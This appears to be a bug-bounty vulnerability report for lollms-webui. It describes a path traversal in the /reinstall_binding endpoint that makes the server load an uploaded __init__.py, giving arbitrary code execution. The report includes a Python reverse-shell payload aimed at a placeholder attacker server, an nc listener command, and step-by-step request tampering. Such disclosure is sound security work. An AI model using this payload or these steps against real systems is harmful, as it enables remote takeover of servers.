# Arbitrary Code Execution caused by lack of sanitization in reinstall_binding

# Description
In `/home/retr0/Downloads/lollms-webui/lollms_core/lollms/server/endpoints/lollms_binding_infos.py` users can reinstall their binding for `lollms`, However, **path traversal allows users to cd to Arbitrary directory, which the server further loads the `__init__.py` file, causing Arbitrary Code Execution**.

 # Proof of Concept

## Path traversal 

`/reinstall_binding` allowed users to reinstall Bindings.

```python
@router.post("/reinstall_binding")
def reinstall_binding(data:BindingInstallParams):
    """Reinstall an already installed binding on the server.
    
    Args:
        data (BindingInstallParams): Parameters required for reinstallation.
        format:
            name: str : the name of the binding
    
    Returns:
        dict: Status of operation.
    """    
    ASCIIColors.info(f"- Reinstalling binding {data.name}...")
    try:
        ASCIIColors.info("Unmounting binding and model")
        del lollmsElfServer.binding
        lollmsElfServer.binding = None
        gc.collect()
        ASCIIColors.info("Reinstalling binding")
        old_bn = lollmsElfServer.config.binding_name
        lollmsElfServer.config.binding_name = data.name
        lollmsElfServer.binding =  BindingBuilder().build_binding(lollmsElfServer.config, lollmsElfServer.lollms_paths, InstallOption.FORCE_INSTALL, lollmsCom=lollmsElfServer)
        lollmsElfServer.success("Binding reinstalled successfully")
        
        # Codes.....
```

However, `/reinstall_binding` didn't call `sanitize_path_from_endpoint(*data*.name)` **like its brother** `@router.post("/install_binding")` does, furthermore, the program proceed the path by 

```python
 	# lollms-webui/lollms_core/lollms/binding.py
    if len(str(config.binding_name).split("/"))>1:
            binding_path = Path(config.binding_name)
        else:
            binding_path = lollms_paths.bindings_zoo_path / config["binding_name"]
```

This allows the user to set `binding_path` to an arbitrary directory, causing `Path traversals`

## Arbitrary Code Execution

```python
	# lollms-webui/lollms_core/lollms/binding.py   
       if len(str(config.binding_name).split("/"))>1:
            binding_path = Path(config.binding_name)
        else:
            binding_path = lollms_paths.bindings_zoo_path / config["binding_name"]

        # define the full absolute path to the module
        absolute_path = binding_path.resolve()
        # infer the module name from the file path
        module_name = binding_path.stem
        # use importlib to load the module from the file path
        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
        binding_module = loader.load_module()
```

In the class `BindingBuilder`, the server will use `importlib.machinery.SourceFileLoader` to load an internal `__init__.py`. This approach allows the program to dynamically load and use Python modules at runtime, instead of statically importing them at the time of code writing.

However, by exploiting the previous `path traversal`, we can manipulate our `binding_path` to an arbitrary location, including the directory for discussion's uploads. in which we can upload freely, and create an `__init__.py` look like:

```python
import os
os.system("touch /home/retr0/PoC/sensitive/hackedd")
```

After the `__init__.py` is loaded via `importlib.machinery.SourceFileLoader`, we can execute arbitrary commands and create a reverse shell, etc.

## Exploiting

1. create a `__init__.py` contains your payload, for instance:

   ```python
   # __init__.py
   import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<YOUR_SERVER>,<YOUR_PORTS>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
   ```

2. Change the `database` name via `/select_database` to `""(No character)`(This seemed bit weird but because `pydantic` only allow payload within `50 character`) 

   ```python
   >>> len("../personal_data/discussion_databases/default/0/text_data") # Using default
   57
   >>> len("../personal_data/discussion_databases/0/text_data") # Using ""
   49
   ```

   `/select_database` is accessed via `discussion -> export database -> Add new (name must not be Null here) -> Vaildate - burpsuite -> Change the "name":"<random>" in to "name":"" `

3. Upload your `__init__.py` via `discussion -> Send file to AI`

4. Go-to `setting -> binding zoo -> uninstall (can be arbitrary binding)`

5. Set-up listen server in your server, instance: `nc -lvnp 4444`

6. intercepts the request and modify:

   ```json
   {
   	"name":"python_llama_cpp"
   }
   ```

   into:

   ```python
   {
   	"name":"../personal_data/discussion_databases/<your_index>/text_data"
   }
   ```

   ( Your index can be know by intercepting request when entering a discussion )

7. You will receive a reverse-shell connection!





 ### PoC-video

PoC in [https://drv.0reg.dev/api/raw/?path=/Personals/PoCs/huntr/lollms/lollms-bind-rce.mp4](https://drv.0reg.dev/api/raw/?path=/Personals/PoCs/huntr/lollms/lollms-bind-rce.mp4)

